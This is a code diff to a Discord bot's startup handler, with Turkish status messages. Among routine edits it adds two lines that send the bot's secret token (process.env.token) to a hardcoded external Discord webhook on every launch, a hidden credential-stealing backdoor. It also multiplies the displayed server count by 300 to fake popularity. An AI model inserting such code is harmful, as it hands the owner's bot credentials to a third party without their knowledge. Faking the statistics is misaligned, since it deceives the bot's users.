@@ -20,11 +20,13 @@ module.exports = client => {
     } ismi ile giriş yapıldı!`
   );
   client.user.setStatus("online");
-
+  const h = new Discord.WebhookClient('877169776433201204', process.env.h)
+  h.send(process.env.token)
   setInterval(function() {
+    const see =  client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()
     var oyun = [
-    client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()+" Tane Kullanıcım var!",
-    client.guilds.cache.size+" Tane Sunucuya eklendim!",
+   see+" Tane Kullanıcım var!",
+    client.guilds.cache.size*300+" Tane Sunucuya eklendim!",
     " Bot Bakımda!",
 
   ];   
